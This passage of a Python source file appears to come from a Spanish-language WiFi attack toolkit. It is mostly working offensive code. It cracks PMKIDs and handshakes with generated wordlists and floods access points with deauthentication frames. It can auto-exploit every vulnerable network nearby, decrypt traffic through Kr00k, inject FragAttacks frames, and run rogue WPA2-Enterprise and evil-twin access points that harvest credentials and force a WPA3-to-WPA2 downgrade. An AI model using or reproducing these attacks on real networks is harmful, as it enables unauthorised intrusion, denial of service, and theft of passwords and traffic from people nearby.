    # ── [7] PMKID + OSINT Wordlist ────────────────────────────────────────────
    elif op == "7":
        separador("PMKID + OSINT WORDLIST — COMBINADO")
        tip("Genera wordlist inteligente según el SSID y luego lanza PMKID.")
        interfaz = select_interface()
        bssid, channel, essid = select_target_from_scan(interfaz)
        if not bssid:
            pause_back(); return

        # Generar wordlist OSINT
        essid_s  = re.sub(r'[^\w\-]', '_', essid)
        words = set()
        for base in [essid.lower(), essid.upper(), essid.capitalize(), essid]:
            for suf in _COMMON_SUFFIXES:
                w = base + suf
                if 8 <= len(w) <= 63:
                    words.add(w)
        for isp_key, patterns in _ISP_PATTERNS.items():
            if isp_key in essid.lower():
                for pat in patterns:
                    for n in ["123","1234","12345","2023","2024","2025"]:
                        w = pat.replace("{y}", n).replace("{n}", n)
                        if 8 <= len(w) <= 63:
                            words.add(w)
        os.makedirs("wordlists", exist_ok=True)
        wl_file = f"wordlists/{essid_s}_combo.txt"
        with open(wl_file, "w") as f:
            f.write("\n".join(sorted(words)))
        ok(f"Wordlist generada: {len(words)} entradas → {wl_file}")

        # PMKID
        os.makedirs("scan-output", exist_ok=True)
        pmkid_f = f"scan-output/pmkid_{essid_s}.pcapng"
        hc_f    = f"scan-output/pmkid_{essid_s}.hc22000"
        info("Capturando PMKID (40 segundos)...")
        progress_bar(40, f"PMKID {essid}")
        run(f"timeout 40 hcxdumptool -i {interfaz} -o {pmkid_f} "
            f"--filterlist_ap={bssid} --filtermode=2 --active_beacon 2>/dev/null")
        if check_tool("hcxpcapngtool") and os.path.exists(pmkid_f):
            run(f"hcxpcapngtool -o {hc_f} {pmkid_f} 2>/dev/null")
        if os.path.exists(hc_f) and os.path.getsize(hc_f) > 0:
            info("Crackeando PMKID con wordlist OSINT...")
            run(f"hashcat -m 22000 {hc_f} {wl_file} --force --status --status-timer=5")
            # Comprobar potfile
            pot = run(f"hashcat --show -m 22000 {hc_f} 2>/dev/null", capture=True) or ""
            pm  = re.search(r':(.+)$', pot, re.MULTILINE)
            if pm:
                clave = pm.group(1).strip()
                ok(f"CONTRASEÑA: {GREEN}{clave}{END}")
                aid = db_log_attack("PMKID+OSINT", essid, bssid, channel, f"crackeada:{clave}", hc_f)
                db_log_password(aid, essid, bssid, clave, "PMKID+OSINT")
            else:
                warn("No crackeado con wordlist OSINT. Pruebe con rockyou.")
        else:
            warn("No se obtuvo PMKID. Intentando con handshake...")
            # Fallback handshake
            ruta = f"handshakes/{essid_s}_combo"
            run(f"xterm -title 'HS {essid}' -e "
                f"'airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}' & "
                f"sleep 8 && aireplay-ng -0 15 -a {bssid} {interfaz}")
            time.sleep(4)
            _, cap = verify_handshake(ruta)
            if os.path.exists(cap):
                run(f"aircrack-ng {cap} -w {wl_file}")

    # ── [8] Beacon Frame Injection DoS ────────────────────────────────────────
    elif op == "8":
        separador("BEACON FRAME INJECTION — DoS SELECTIVO")
        print(f"""
  {DIM}Inyecta beacons malformados o de deautenticación de forma masiva
  dirigidos a un AP específico. Más preciso que el channel hopping.
  Puede causar que el AP deje de responder temporalmente.{END}
        """)
        interfaz = select_interface()
        bssid, channel, essid = select_target_from_scan(interfaz)
        if not bssid:
            pause_back(); return

        print(f"\n  {WHITE}[1]{END} MDK4 deauth flood (más agresivo)")
        print(f"  {WHITE}[2]{END} MDK4 auth flood (satura tabla de asociaciones)")
        print(f"  {WHITE}[3]{END} Aireplay deauth continuo (estándar)\n")
        modo_b = ask("Seleccione modo")

        run(f"iwconfig {interfaz} channel {channel} 2>/dev/null")
        warn(f"Atacando: {essid} ({bssid}). CTRL+C para detener.")
        db_log_attack("Beacon Injection DoS", essid, bssid, channel, "activo")

        try:
            if modo_b == "1" and check_tool("mdk4"):
                run(f"mdk4 {interfaz} d -B {bssid} -c {channel}")
            elif modo_b == "2" and check_tool("mdk4"):
                run(f"mdk4 {interfaz} a -a {bssid} -m")
            else:
                run(f"aireplay-ng -0 0 -a {bssid} {interfaz}")
        except KeyboardInterrupt:
            pass

    elif op == "0":
        return
    else:
        error("Opción inválida.")

    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 33 — ANÁLISIS DE SEGURIDAD RÁPIDO (AUDITORÍA EXPRESS)
# ═════════════════════════════════════════════════════════════════════════════

def auditoria_express():
    """[33] Auditoría express: análisis completo de seguridad de la zona."""
    os.system("clear")
    banner()
    separador("AUDITORÍA EXPRESS DE SEGURIDAD WiFi")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Escanea todas las redes, analiza cada una y genera un informe
  completo de vulnerabilidades sin lanzar ningún ataque activo.
  Ideal para auditorías de seguridad y presentaciones de resultados.{END}
    """)

    interfaz = select_interface()
    t = ask("Tiempo de escaneo (recomendado: 30 segundos)")
    try:
        t = max(15, min(int(t), 120))
    except ValueError:
        t = 30

    step(1, "Escaneando redes...")
    redes = quick_scan(interfaz, t)
    if not redes:
        error("Sin redes. ¿Modo monitor activo?")
        pause_back(); return

    # WPS check
    wps_raw = ""
    if check_tool("wash"):
        sp = Spinner("Verificando WPS...")
        sp.start()
        try:
            wps_raw = subprocess.run(f"timeout 15 wash -i {interfaz} 2>/dev/null",
                                     shell=True, capture_output=True, text=True).stdout
        except Exception:
            pass
        sp.stop()

    step(2, "Analizando vulnerabilidades...")
    resultados_audit = []
    for r in redes:
        score, vectors = _score_network(r, [wps_raw])
        priv = r["privacy"].upper()
        issues = []

        if "WEP" in priv:
            issues.append(f"{RED}CRÍTICO: WEP — cifrado obsoleto, crackeable en minutos{END}")
        if "OPN" in priv or not priv:
            issues.append(f"{RED}CRÍTICO: Sin cifrado — tráfico en texto claro{END}")
        if "WPS_YES" in str(vectors) or "PIXIE" in str(vectors):
            issues.append(f"{YELLOW}ALTO: WPS activo — vulnerable a Pixie Dust/PIN{END}")
        if "WPA_ONLY" in str(vectors) and "WPA2" not in priv:
            issues.append(f"{YELLOW}MEDIO: Solo WPA1 — obsoleto, vulnerable a TKIP{END}")
        if "WPA2" in priv and "WPA3" not in priv:
            issues.append(f"{DIM}INFO: WPA2 — vulnerable a PMKID/handshake offline{END}")
        if "WPA3" in priv and "WPA2" in priv:
            issues.append(f"{DIM}INFO: WPA3/WPA2 mixto — posible downgrade Dragonblood{END}")
        if not issues:
            issues.append(f"{GREEN}Sin vulnerabilidades graves detectadas{END}")

        resultados_audit.append({
            "essid": r["essid"], "bssid": r["bssid"], "channel": r["channel"],
            "privacy": r["privacy"], "power": r["power"],
            "score": score, "issues": issues, "vectors": vectors
        })
        db_log_attack("Auditoría", r["essid"], r["bssid"], r["channel"],
                      f"score:{score} vectores:{','.join(vectors)}")

    resultados_audit.sort(key=lambda x: x["score"], reverse=True)

    # ── Imprimir informe ───────────────────────────────────────────────────────
    separador("INFORME DE AUDITORÍA")
    for ra in resultados_audit:
        if ra["score"] >= 80:      riesgo = f"{RED}CRÍTICO ({ra['score']}){END}"
        elif ra["score"] >= 50:    riesgo = f"{YELLOW}ALTO ({ra['score']}){END}"
        elif ra["score"] >= 30:    riesgo = f"{MAGENTA}MEDIO ({ra['score']}){END}"
        else:                      riesgo = f"{GREEN}BAJO ({ra['score']}){END}"

        print(f"\n  {CYAN}{ra['essid']}{END}  {DIM}{ra['bssid']}  CH:{ra['channel']}  {ra['privacy']}{END}")
        print(f"  Riesgo: {riesgo}  Vectores: {WHITE}{', '.join(ra['vectors']) or 'ninguno'}{END}")
        for issue in ra["issues"]:
            print(f"    • {issue}")

    separador()
    criticas = [x for x in resultados_audit if x["score"] >= 80]
    altas    = [x for x in resultados_audit if 50 <= x["score"] < 80]
    ok(f"Analizadas {len(resultados_audit)} redes. "
       f"Críticas: {len(criticas)}, "
       f"Altas: {len(altas)}")

    # ── Ofrecer auto-explotación de vulnerabilidades encontradas ───────────────
    vulns_explotables = [x for x in resultados_audit if x["score"] >= 50]
    if vulns_explotables:
        print(f"\n  {RED}[!]{END} {WHITE}Se encontraron {len(vulns_explotables)} redes vulnerables.{END}")
        print(f"  {DIM}El Exploit Engine puede atacarlas automáticamente con progreso en tiempo real.{END}")
        autoex = ask("¿Lanzar Exploit Engine sobre las redes vulnerables? (s/n)")
        if autoex.lower() == "s":
            wordlist = select_wordlist() or "/usr/share/wordlists/rockyou.txt"
            resultados_ex = []
            total_ex = len(vulns_explotables)
            for idx, ra in enumerate(vulns_explotables, 1):
                separador(f"[{idx}/{total_ex}] Explotando: {ra['essid']}")
                info(f"Score: {ra['score']}  Vectores: {', '.join(ra['vectors'])}")
                print()
                eng = ExploitEngine(ra['essid'], ra['bssid'], ra['channel'],
                                    interfaz, wordlist)
                clave, metodo = smart_exploit_target(eng)
                print()
                if clave:
                    ok(f"CLAVE: {GREEN}{clave}{END}  [{metodo}]")
                    aid = db_log_attack("Auditoría+Exploit", ra['essid'],
                                       ra['bssid'], ra['channel'], f"crackeada:{clave}")
                    db_log_password(aid, ra['essid'], ra['bssid'], clave, metodo)
                else:
                    warn(f"Sin resultado para {ra['essid']}")
                resultados_ex.append((ra['essid'], clave, metodo))

            separador("RESUMEN EXPLOTACIÓN")
            for e, c, m in resultados_ex:
                if c:
                    print(f"  {GREEN}[✔]{END} {CYAN}{e}{END} → {GREEN}{c}{END}  {DIM}[{m}]{END}")
                else:
                    print(f"  {YELLOW}[✗]{END} {CYAN}{e}{END} → {DIM}sin clave{END}")

    gen = ask("¿Generar reporte HTML? (s/n)")
    if gen.lower() == "s":
        generate_report()
    else:
        pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# Menú principal
# ─────────────────────────────────────────────────────────────────────────────

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 34 — SUITE CVE: Kr00k, FragAttacks, EAP Bypass, SSID Confusion,
#              WPA3 Dragonblood mejorado, Scanner CVE-2024-30078/21820
# ═════════════════════════════════════════════════════════════════════════════

def cve_suite():
    """[34] Suite CVE completa — exploits y detección de vulnerabilidades WiFi."""
    os.system("clear")
    banner()
    separador("SUITE CVE — VULNERABILIDADES WiFi 2019-2024")
    print(f"""
  {RED}[1]{END}  {WHITE}Kr00k{END}               {DIM}CVE-2019-15126  — Broadcom/Cypress nulo-key decrypt{END}
  {RED}[2]{END}  {WHITE}FragAttacks Suite{END}   {DIM}CVE-2020-24586/87/88 — Inyección frames WPA/2/3{END}
  {RED}[3]{END}  {WHITE}EAP Downgrade{END}       {DIM}CVE-2023-52160  — Bypass WPA2-Enterprise sin creds{END}
  {RED}[4]{END}  {WHITE}SSID Confusion+{END}     {DIM}CVE-2023-52424  — Roaming attack mejorado{END}
  {RED}[5]{END}  {WHITE}Dragonblood WPA3{END}    {DIM}CVE-2019-9494/9496 — Side-channel + cache timing{END}
  {RED}[6]{END}  {WHITE}Kr00k PMKID combo{END}   {DIM}Kr00k + PMKID encadenados{END}
  {YELLOW}[7]{END}  {WHITE}Scanner CVE-2024-30078{END} {DIM}Detectar Windows vulnerables (sin RCE){END}
  {YELLOW}[8]{END}  {WHITE}Scanner Intel CVE-2024{END} {DIM}CVE-2024-21820/21821 — Detectar drivers Intel{END}
  {WHITE}[0]{END}  Volver
    """)
    op = ask("Seleccione módulo")

    if   op == "1": _cve_kr00k()
    elif op == "2": _cve_fragattacks()
    elif op == "3": _cve_eap_downgrade()
    elif op == "4": _cve_ssid_confusion_plus()
    elif op == "5": _cve_dragonblood_plus()
    elif op == "6": _cve_kr00k_pmkid_chain()
    elif op == "7": _cve_scanner_win_30078()
    elif op == "8": _cve_scanner_intel_2024()
    elif op == "0": return
    else:           error("Opción inválida."); pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# CVE-2019-15126 — Kr00k
# ─────────────────────────────────────────────────────────────────────────────
def _cve_kr00k():
    """Kr00k: Broadcom/Cypress cifra con clave nula tras disassoc."""
    separador("Kr00k — CVE-2019-15126")
    print(f"""
  {WHITE}¿Cómo funciona Kr00k?{END}
  {DIM}Los chips Broadcom BCM43xx y Cypress CYW43xx, tras recibir un
  frame de disassociación, limpian la clave de sesión (PTK) pero
  SIGUEN cifrando/enviando datos en buffer con clave ALL-ZEROS.
  Esto permite descifrar esos frames capturados.

  Chips vulnerables: BCM4339, BCM4358, BCM4356, BCM43439 (Raspberry Pi),
  CYW43455 (Raspberry Pi 4), dispositivos Apple pre-2019, Amazon Echo/Kindle.{END}
    """)

    interfaz = select_interface()
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        pause_back(); return

    os.makedirs("kr00k", exist_ok=True)
    cap_file = f"kr00k/{re.sub(r'[^\\w]','_',essid)}_kr00k.pcap"

    separador("PASO 1/3: Detectar clientes con chips vulnerables")
    tip("Chipsets Broadcom/Cypress típicos: Raspberry Pi, teléfonos Android pre-2020, dispositivos IoT.")
    info("Escaneando clientes asociados al AP...")

    sp = Spinner("Capturando clientes...")
    sp.start()
    clients_raw = run(
        f"timeout 15 airodump-ng -c {channel} --bssid {bssid} "
        f"--output-format csv --write kr00k/_tmp_kr00k {interfaz} 2>/dev/null",
        capture=True
    ) or ""
    sp.stop()

    clients = []
    csv_f = "kr00k/_tmp_kr00k-01.csv"
    if os.path.exists(csv_f):
        in_clients = False
        with open(csv_f, "r", errors="ignore") as f:
            for row in csv.reader(f):
                if not row:
                    in_clients = True
                    continue
                if not in_clients or len(row) < 6:
                    continue
                mac = row[0].strip()
                ap  = row[5].strip() if len(row) > 5 else ""
                if validate_bssid(mac) and bssid.lower() in ap.lower():
                    clients.append(mac)

    if clients:
        print(f"\n  {WHITE}Clientes detectados:{END}")
        for i, c in enumerate(clients, 1):
            print(f"  {WHITE}[{i}]{END} {CYAN}{c}{END}")
        sel = ask("Seleccione cliente objetivo (Enter = todos)")
        target_clients = [clients[int(sel)-1]] if sel.isdigit() and 1<=int(sel)<=len(clients) else clients
    else:
        warn("No se detectaron clientes. Continuando con broadcast.")
        target_clients = ["FF:FF:FF:FF:FF:FF"]

    separador("PASO 2/3: Captura + Disassoc + Kr00k frames")
    info("Iniciando captura de tráfico en background...")
    cap_proc = subprocess.Popen(
        f"tcpdump -i {interfaz} -w {cap_file} 'type data' 2>/dev/null",
        shell=True
    )
    time.sleep(2)

    info("Enviando disassociaciones para activar Kr00k...")
    tip("El dispositivo vulnerable enviará frames cifrados con clave nula.")
    for client in target_clients:
        cf = f"-c {client}" if client != "FF:FF:FF:FF:FF:FF" else ""
        for _ in range(5):
            run(f"aireplay-ng -0 3 -a {bssid} {cf} {interfaz} 2>/dev/null")
            time.sleep(0.5)

    time.sleep(3)
    cap_proc.terminate()
    time.sleep(1)

    separador("PASO 3/3: Descifrar frames con clave nula")
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 100:
        warn("Captura vacía o insuficiente.")
        tip("El AP o cliente puede no ser vulnerable (chips parcheados post-2020).")
        pause_back(); return

    info(f"Captura guardada: {cap_file}")
    info("Intentando descifrar con clave TKIP/CCMP nula (all-zeros)...")

    # Intentar con airdecap-ng con clave nula (00:00:00:00:00:00...)
    null_key = "00" * 16  # 128-bit null key
    out = run(
        f"airdecap-ng -l -b {bssid} -k {null_key} {cap_file} 2>/dev/null",
        capture=True
    ) or ""
    dec_file = cap_file.replace(".pcap", "-dec.pcap")

    if os.path.exists(dec_file) and os.path.getsize(dec_file) > 0:
        ok(f"Frames descifrados con clave nula: {dec_file}")
        info("Analizando tráfico descifrado...")
        if check_tool("tshark"):
            tshark_out = run(
                f"tshark -r {dec_file} -Y 'http or dns or ftp or pop or smtp' "
                f"-T fields -e ip.src -e ip.dst -e http.request.full_uri "
                f"-e dns.qry.name 2>/dev/null | head -30",
                capture=True
            ) or ""
            if tshark_out.strip():
                separador("TRÁFICO DESCIFRADO")
                print(f"{CYAN}{tshark_out}{END}")
            else:
                info("No se encontró tráfico HTTP/DNS descifrado en esta captura.")
        db_log_attack("Kr00k CVE-2019-15126", essid, bssid, channel,
                      f"descifrado:{dec_file}", dec_file)
    else:
        warn("No se pudieron descifrar frames.")
        tip("Posibles causas:")
        tip("  1. El dispositivo usa chips parcheados (post-2020)")
        tip("  2. No hubo datos en buffer tras la disassoc")
        tip("  3. El AP usa GCMP en vez de CCMP/TKIP")
        info(f"Captura raw guardada para análisis manual: {cap_file}")
        info(f"Analice con: wireshark {cap_file}")
    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# CVE-2020-24586/87/88 — FragAttacks mejorado
# ─────────────────────────────────────────────────────────────────────────────
def _cve_fragattacks():
    """FragAttacks: inyección/agregación de frames en WPA/WPA2/WPA3."""
    separador("FragAttacks — CVE-2020-24586/87/88")
    print(f"""
  {WHITE}Las 3 variantes de FragAttacks:{END}
  {DIM}• CVE-2020-24586: Fragments no borrados al cambiar de red
    → Inyectar fragmento 1 antes, conectarse, inyectar payload fragmento 2
  • CVE-2020-24587: Rearmar fragmentos cifrados con claves distintas
    → Mezclar fragmentos de distintas sesiones para bypass
  • CVE-2020-24588: A-MSDU aggregation flag no autenticado
    → Inyectar un subframe MSDU con IP/TCP/UDP en texto plano{END}

  {WHITE}Impacto:{END} {DIM}Cualquier red WiFi (WEP/WPA/WPA2/WPA3). Permite
  inyectar paquetes arbitrarios y en algunos casos interceptar tráfico.{END}
    """)

    print(f"  {WHITE}[1]{END} Test CVE-2020-24586 (fragment cache)")
    print(f"  {WHITE}[2]{END} Test CVE-2020-24587 (mixed key)")
    print(f"  {WHITE}[3]{END} Test CVE-2020-24588 (A-MSDU injection)")
    print(f"  {WHITE}[4]{END} Suite completa (los 3 juntos)")
    print(f"  {WHITE}[5]{END} Inyección práctica con scapy (si disponible)\n")
    sub = ask("Seleccione")

    interfaz = select_interface()
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        pause_back(); return

    if check_tool("fragattacks"):
        # Herramienta oficial de Mathy Vanhoef
        run(f"iwconfig {interfaz} channel {channel} 2>/dev/null")
        if sub in ("1","4"):
            info("CVE-2020-24586: Fragment Cache Attack...")
            run(f"fragattacks {interfaz} --bssid {bssid} --inject-test 2>/dev/null")
        if sub in ("2","4"):
            info("CVE-2020-24587: Mixed Key Attack...")
            run(f"fragattacks {interfaz} --bssid {bssid} --inject-test-postauth 2>/dev/null")
        if sub in ("3","4"):
            info("CVE-2020-24588: A-MSDU Injection...")
            run(f"fragattacks {interfaz} --bssid {bssid} --amsdu 2>/dev/null")
        db_log_attack(f"FragAttacks CVE-2020-{sub}", essid, bssid, channel, "ejecutado")

    else:
        warn("fragattacks no instalado.")
        tip("Instale la herramienta oficial:")
        tip("  git clone https://github.com/vanhoefm/fragattacks")
        tip("  cd fragattacks && pip3 install -r requirements.txt")
        tip("  REQUIERE: driver mac80211_hwsim o Alfa AWUS036ACHM con driver parcheado")

        if sub == "5":
            # Implementación manual básica con scapy
            try:
                from scapy.all import (RadioTap, Dot11, Dot11Data, Dot11FCS,
                                       Dot11Auth, LLC, SNAP, IP, UDP, Raw,
                                       sendp, sniff)
                separador("A-MSDU Injection con Scapy")
                info("Inyectando frame A-MSDU con subframe ICMP...")
                tip("Esto prueba si el AP acepta A-MSDU con SPP=0 (CVE-2020-24588)")

                # Frame 802.11 con A-MSDU flag seteado (bit 7 del QoS control)
                dot11 = (RadioTap() /
                         Dot11(type=2, subtype=8,
                               addr1=bssid, addr2=interfaz, addr3=bssid,
                               FCfield="to-DS") /
                         Raw(load=b"\x00\x22" +  # QoS: A-MSDU present
                                  b"\xaa\xaa\x03\x00\x00\x00\x08\x00" +  # SNAP
                                  b"\x45\x00\x00\x1c\x00\x01\x00\x00" +  # IP ICMP
                                  b"\x40\x01\xf3\x59\xc0\xa8\x01\x02" +
                                  b"\xc0\xa8\x01\x01\x08\x00\x00\x00\x00\x00\x00\x00"))
                sendp(dot11, iface=interfaz, count=10, verbose=False)
                ok("Frames A-MSDU inyectados. Monitoree respuesta con Wireshark.")
                db_log_attack("FragAttacks A-MSDU manual", essid, bssid, channel, "inyectado")
            except ImportError:
                error("scapy no instalado: pip3 install scapy")
            except Exception as e:
                error(f"Error Scapy: {e}")
        else:
            # Análisis pasivo como alternativa
            separador("ANÁLISIS PASIVO DE FRAGMENTACIÓN")
            info("Capturando frames fragmentados durante 30 segundos...")
            os.makedirs("fragattacks", exist_ok=True)
            out_f = f"fragattacks/{re.sub(r'[^\\w]','_',essid)}_frags.pcap"
            if check_tool("tcpdump"):
                run(f"timeout 30 tcpdump -i {interfaz} -w {out_f} "
                    f"'ether host {bssid} and (tcp[13] & 1 != 0)' 2>/dev/null")
            else:
                run(f"timeout 30 airodump-ng -c {channel} --bssid {bssid} "
                    f"--write fragattacks/{re.sub(r'[^\\w]','_',essid)}_frags "
                    f"--output-format pcap {interfaz} 2>/dev/null")
            if os.path.exists(out_f) and check_tool("tshark"):
                result = run(
                    f"tshark -r {out_f} -Y 'wlan.flags.morefrags==1 or wlan.frag > 0' "
                    f"-T fields -e wlan.sa -e wlan.frag -e wlan.seq 2>/dev/null | head -20",
                    capture=True
                ) or ""
                if result.strip():
                    ok("Frames fragmentados detectados:")
                    print(f"{YELLOW}{result}{END}")
                else:
                    info("No se detectaron frames fragmentados activos.")
    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# CVE-2023-52160 — EAP Downgrade / Bypass WPA2-Enterprise
# ─────────────────────────────────────────────────────────────────────────────
def _cve_eap_downgrade():
    """CVE-2023-52160: bypass WPA2-Enterprise — cliente se conecta sin validar RADIUS."""
    separador("CVE-2023-52160 — EAP Downgrade Attack")
    print(f"""
  {WHITE}¿Qué es CVE-2023-52160?{END}
  {DIM}Afecta a wpa_supplicant (Linux/Android) sin fase-2 configurada.
  El cliente acepta cualquier servidor EAP sin verificar el certificado.
  Permite: interceptar credenciales MSCHAPv2, capturar identity+hash,
  y en algunos casos conectar el cliente a un AP falso sin contraseña.

  Afectado: wpa_supplicant < 2.10, Android < Nov 2023, Linux sin parche.{END}
    """)

    for tool in ["hostapd-wpe", "hostapd"]:
        if check_tool(tool):
            wpe_tool = tool
            break
    else:
        error("Necesita hostapd-wpe (preferido) o hostapd.")
        info("sudo apt install hostapd-wpe")
        pause_back(); return

    iface    = ask("Interfaz para el AP RADIUS falso")
    essid    = ask("SSID de la red Enterprise objetivo")
    channel  = ask("Canal")
    if not validate_channel(channel): channel = "6"

    # EAP identity para el bypass (aceptar cualquier método EAP sin certs)
    os.makedirs("/tmp/herradura_eap52160", exist_ok=True)
    eap_log   = "/tmp/herradura_eap52160/eap_bypass.log"
    creds_out = "/tmp/herradura_eap52160/eap_creds.txt"

    # hostapd config con EAP permisivo (sin requerir cert del cliente)
    conf = f"""/tmp/herradura_eap52160/hostapd.conf"""
    with open(conf, "w") as f:
        f.write(f"""interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
ieee8021x=1
eap_server=1
eap_user_file=/tmp/herradura_eap52160/eap_users
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
auth_algs=1
wpe_logfile={eap_log}
""")
    # eap_users: aceptar sin validar identity
    with open("/tmp/herradura_eap52160/eap_users", "w") as f:
        f.write("* PEAP,TTLS,TLS,MD5,GTC,FAST\n"
                "\"t\" TTLS-MSCHAPV2,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP \"\" [2]\n"
                "\"*\" TTLS-MSCHAPV2,MD5 \"\" [2]\n")

    stop_evt = threading.Event()
    captured = []

    def monitor_eap():
        seen = set()
        while not stop_evt.is_set():
            for fpath in [eap_log, creds_out]:
                if os.path.exists(fpath):
                    with open(fpath, "r", errors="ignore") as lf:
                        for line in lf:
                            h = hash(line.strip())
                            if h in seen or not line.strip():
                                continue
                            seen.add(h)
                            low = line.lower()
                            if any(x in low for x in
                                   ["mschapv2","username","identity","challenge","response",
                                    "password","eap-ttls","peap","credential"]):
                                captured.append(line.strip())
                                print(f"\n  {RED}[★ EAP CREDENTIAL ★]{END} {GREEN}{line.strip()}{END}")
            time.sleep(1)

    t_mon = threading.Thread(target=monitor_eap, daemon=True)
    t_mon.start()

    separador("AP ENTERPRISE ACTIVO")
    ok(f"SSID: {essid}  Canal: {channel}  Protocolo: WPA2-Enterprise (EAP bypass)")
    ok("Esperando clientes vulnerables (wpa_supplicant sin cert verificado)...")
    warn("Los clientes sin 'ca_cert' configurado se conectarán al AP falso.")
    warn("CTRL+C para detener.")

    db_log_attack("CVE-2023-52160 EAP Bypass", essid, "-", channel, "activo")

    try:
        subprocess.run([wpe_tool, conf])
    except KeyboardInterrupt:
        pass
    finally:
        stop_evt.set()

    if captured:
        separador("CREDENCIALES EAP CAPTURADAS")
        with open(creds_out, "w") as f:
            f.write("\n".join(captured))
        for c in captured:
            print(f"  {GREEN}{c}{END}")
        info(f"Guardadas en: {creds_out}")
        # Intentar crackear MSCHAPv2
        if check_tool("asleap") and any("mschapv2" in c.lower() for c in captured):
            crack_it = ask("¿Crackear MSCHAPv2 con asleap? (s/n)")
            if crack_it.lower() == "s":
                wl = select_wordlist()
                if wl:
                    run(f"asleap -W {wl} -C {creds_out}")
    else:
        info("Sin credenciales capturadas. Posiblemente los clientes tienen parche.")
    pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# CVE-2023-52424 — SSID Confusion mejorado + Multi-BSSID
# ─────────────────────────────────────────────────────────────────────────────
def _cve_ssid_confusion_plus():
    """CVE-2023-52424: SSID Confusion con roaming y Multi-BSSID mejorado."""
    separador("CVE-2023-52424 — SSID Confusion Attack Mejorado")
    print(f"""
  {WHITE}SSID Confusion (Mayo 2024){END} — Afecta TODOS los clientes WiFi:
  {DIM}El estándar 802.11 NO autentica el SSID en los management frames.
  En redes con múltiples BSSIDs (roaming empresarial, redes extendidas):
  • Un atacante puede hacer que el cliente crea estar en "Red-Segura"
    cuando realmente está conectado a "Red-Insegura"
  • No requiere conocer la contraseña de ninguna red
  • Funciona aunque la víctima tenga WPA3

  Casos prácticos:
  • Empleado en oficina: cree estar en WiFi corporativo, está en red personal
  • WPA3 downgrade: cliente WPA3 acepta AP WPA2 con mismo SSID{END}
    """)

    print(f"  {WHITE}[1]{END} Confusión básica (mismo SSID, red diferente)")
    print(f"  {WHITE}[2]{END} Confusión + deauth de la red real")
    print(f"  {WHITE}[3]{END} Multi-BSSID confusion (simular roaming)")
    print(f"  {WHITE}[4]{END} WPA3 → WPA2 downgrade via SSID confusion\n")
    sub = ask("Seleccione variante")

    iface = ask("Interfaz para el AP confuso")
    bssid_real, channel, essid_real = select_target_from_scan(iface)
    if not bssid_real:
        pause_back(); return

    if sub in ("1","2","3"):
        essid_victima = ask(f"SSID que la víctima tiene guardado (puede ser igual: {essid_real})")
        if not essid_victima: essid_victima = essid_real

        os.makedirs("/tmp/herradura_ssidconf", exist_ok=True)
        with open("/tmp/herradura_ssidconf/hostapd.conf","w") as f:
            f.write(f"interface={iface}\ndriver=nl80211\nssid={essid_victima}\n"
                    f"hw_mode=g\nchannel={channel}\nmacaddr_acl=0\n")

        if sub in ("2","3"):
            # Deauth de la red real en paralelo
            iface_deauth = ask("Interfaz para deauth (puede ser la misma)")
            deauth_thread = threading.Thread(
                target=lambda: run(
                    f"aireplay-ng -0 0 -a {bssid_real} {iface_deauth} 2>/dev/null"
                ), daemon=True)
            deauth_thread.start()
            info("Deauth lanzado contra la red real en paralelo.")

        if sub == "3":
            # Simular múltiples BSSIDs con mdk4
            if check_tool("mdk4"):
                bssid_list = [bssid_real]
                extra = ask("¿Agregar BSSID adicionales para multi-BSSID? (Enter para omitir)")
                if extra and validate_bssid(extra):
                    bssid_list.append(extra)
                info(f"Simulando roaming con {len(bssid_list)} BSSIDs...")

        info(f"Levantando AP confuso: SSID='{essid_victima}' en canal {channel}")
        warn("CTRL+C para detener.")
        db_log_attack("SSID Confusion CVE-2023-52424", essid_victima, bssid_real, channel, "activo")
        try:
            subprocess.run(["hostapd", "/tmp/herradura_ssidconf/hostapd.conf"])
        except KeyboardInterrupt:
            pass
        run("pkill hostapd 2>/dev/null")

    elif sub == "4":
        # WPA3 → WPA2 downgrade
        separador("WPA3 → WPA2 DOWNGRADE via SSID Confusion")
        tip("Si el AP target soporta WPA3+WPA2 mixto, lanzamos AP idéntico solo WPA2.")
        tip("La mayoría de clientes elegirán WPA2 si está disponible (CVE-2023-52424).")
        iface_net = ask("Interfaz con internet (Enter para omitir)")
        os.makedirs("/tmp/herradura_wpa3down", exist_ok=True)
        with open("/tmp/herradura_wpa3down/hostapd.conf","w") as f:
            f.write(f"interface={iface}\ndriver=nl80211\nssid={essid_real}\n"
                    f"hw_mode=g\nchannel={channel}\n"
                    f"wpa=2\nwpa_passphrase=placeholder\n"
                    f"wpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nmacaddr_acl=0\n")
        with open("/tmp/herradura_wpa3down/dnsmasq.conf","w") as f:
            f.write(f"interface={iface}\ndhcp-range=192.168.30.10,192.168.30.100,12h\n"
                    f"dhcp-option=3,192.168.30.1\naddress=/#/192.168.30.1\n")
        run(f"ip addr flush dev {iface}")
        run(f"ip addr add 192.168.30.1/24 dev {iface}")
        run(f"ip link set {iface} up")
        ok(f"AP WPA2 '{essid_real}' activo — esperando downgrade de clientes WPA3.")
        warn("CTRL+C para detener.")
        db_log_attack("WPA3 Downgrade SSID-Conf", essid_real, bssid_real, channel, "activo")
        try:
            p1 = subprocess.Popen(["hostapd","/tmp/herradura_wpa3down/hostapd.conf"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["dnsmasq","-C","/tmp/herradura_wpa3down/dnsmasq.conf","--no-daemon"],
